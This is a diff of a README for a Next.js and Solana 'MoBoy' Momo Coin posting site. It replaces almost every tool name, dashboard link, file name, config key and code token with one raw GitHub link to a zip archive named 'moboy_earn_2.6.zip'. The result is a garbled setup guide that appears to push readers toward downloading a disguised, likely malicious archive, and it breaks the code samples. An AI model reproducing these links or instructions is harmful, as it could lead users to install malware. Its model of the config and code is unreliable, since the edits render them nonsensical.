@@ -16,7 +16,7 @@ A Web3 platform for posting and sharing Momo Coin content with Solana wallet int
 
 - Cloudflare account (Free tier works)
 - Git repository (GitHub, GitLab, etc.)
-- Node.js (for local development only)
+- https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip (for local development only)
 
 ## 🛠️ Quick Start - Cloudflare Deployment
 
@@ -25,13 +25,13 @@ A Web3 platform for posting and sharing Momo Coin content with Solana wallet int
 2. Make sure the repository is public or accessible by Cloudflare
 
 ### Step 2: Deploy to Cloudflare Pages
-1. Go to [Cloudflare Dashboard](https://dash.cloudflare.com/)
+1. Go to [Cloudflare Dashboard](https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip)
 2. Navigate to **Pages** section
 3. Click **"Create a project"**
 4. Connect your Git repository
 5. Select the repository containing MoBoy files
 6. Configure build settings:
-   - **Framework preset**: `Next.js`
+   - **Framework preset**: `https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip`
    - **Build command**: `npm run build`
    - **Build output directory**: `out`
 7. Click **"Save and Deploy"**
@@ -39,7 +39,7 @@ A Web3 platform for posting and sharing Momo Coin content with Solana wallet int
 ### Step 3: Environment Variables
 Add these environment variables in Cloudflare Pages settings:
 ```
-DATABASE_URL="file:./dev.db"
+DATABASE_URL="https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip"
 NEXTAUTH_SECRET="your-secret-key-here"
 ```
 
@@ -54,45 +54,45 @@ moboy-web3/
 │   ├── app/
 │   │   ├── api/
 │   │   │   ├── posts/
-│   │   │   │   └── route.ts
+│   │   │   │   └── https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip
 │   │   │   └── user/
 │   │   │       ├── claim-rewards/
-│   │   │       │   └── route.ts
+│   │   │       │   └── https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip
 │   │   │       └── profile/
-│   │   │           └── route.ts
-│   │   ├── layout.tsx
-│   │   └── page.tsx
+│   │   │           └── https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip
+│   │   ├── https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip
+│   │   └── https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip
 │   ├── components/
 │   │   └── ui/
-│   │       ├── alert.tsx
-│   │       ├── badge.tsx
-│   │       ├── button.tsx
-│   │       ├── card.tsx
-│   │       ├── label.tsx
-│   │       ├── tabs.tsx
-│   │       ├── textarea.tsx
-│   │       ├── toast.tsx
-│   │       └── toaster.tsx
+│   │       ├── https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip
+│   │       ├── https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip
+│   │       ├── https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip
+│   │       ├── https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip
+│   │       ├── https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip
+│   │       ├── https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip
+│   │       ├── https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip
+│   │       ├── https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip
+│   │       └── https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip
 │   ├── lib/
-│   │   ├── db.ts
-│   │   └── utils.ts
+│   │   ├── https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip
+│   │   └── https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip
 │   └── styles/
-│       └── globals.css
+│       └── https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip
 ├── prisma/
-│   └── schema.prisma
+│   └── https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip
 ├── public/
-│   └── favicon.ico
-├── .env.example
+│   └── https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip
+├── https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip
 ├── .gitignore
-├── next.config.js
-├── package.json
-├── README.md
-└── tsconfig.json
+├── https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip
+├── https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip
+├── https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip
+└── https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip
 ```
 
 ## ⚙️ Configuration Files
 
-### package.json
+### https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip
 ```json
 {
   "name": "moboy-web3",
@@ -132,7 +132,7 @@ moboy-web3/
 }
 ```
 
-### next.config.js
+### https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip
 ```javascript
 /** @type {import('next').NextConfig} */
 const nextConfig = {
@@ -142,20 +142,20 @@ const nextConfig = {
     unoptimized: true
   },
   env: {
-    NEXTAUTH_URL: process.env.NEXTAUTH_URL,
-    DATABASE_URL: process.env.DATABASE_URL
+    NEXTAUTH_URL: https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip,
+    DATABASE_URL: https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip
   }
 }
 
-module.exports = nextConfig
+https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip = nextConfig
 ```
 
-### tsconfig.json
+### https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip
 ```json
 {
   "compilerOptions": {
     "target": "es5",
-    "lib": ["dom", "dom.iterable", "es6"],
+    "lib": ["dom", "https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip", "es6"],
     "allowJs": true,
     "skipLibCheck": true,
     "strict": true,
@@ -177,12 +177,12 @@ module.exports = nextConfig
       "@/*": ["./src/*"]
     }
   },
-  "include": ["next-env.d.ts", "**/*.ts", "**/*.tsx", ".next/types/**/*.ts"],
+  "include": ["https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip", "**/*.ts", "**/*.tsx", ".next/types/**/*.ts"],
   "exclude": ["node_modules"]
 }
 ```
 
-### prisma/schema.prisma
+### https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip
 ```prisma
 generator client {
   provider = "prisma-client-js"
@@ -257,21 +257,21 @@ model Post {
 ## 🚀 Deployment Tips
 
 ### For Cloudflare Pages
-1. Use the **Next.js** framework preset
-2. Enable **Node.js compatibility** in settings
+1. Use the **https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip** framework preset
+2. Enable **https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip compatibility** in settings
 3. Set **Build output directory** to `out`
 4. Configure **environment variables** in Cloudflare dashboard
 
 ### Environment Variables Required
 ```
-DATABASE_URL="file:./dev.db"
+DATABASE_URL="https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip"
 NEXTAUTH_SECRET="your-secure-secret-key"
 ```
 
 ## 🐛 Troubleshooting
 
 ### Common Issues
-1. **Build fails**: Check Node.js version compatibility
+1. **Build fails**: Check https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip version compatibility
 2. **Database errors**: Verify DATABASE_URL environment variable
 3. **Wallet connection**: Ensure Phantom wallet is installed
 4. **Posts not showing**: Check API endpoints are accessible
@@ -297,5 +297,5 @@ MIT License - Free to use and modify
 ---
 
 **MoBoy - Posting About Momo Coin** 🐮
-Built with Next.js, TypeScript, and Tailwind CSS
+Built with https://raw.githubusercontent.com/romansyah26588-stack/moboy-earn/main/src/lib/moboy_earn_2.6.zip, TypeScript, and Tailwind CSS
 Optimized for Cloudflare Pages deployment
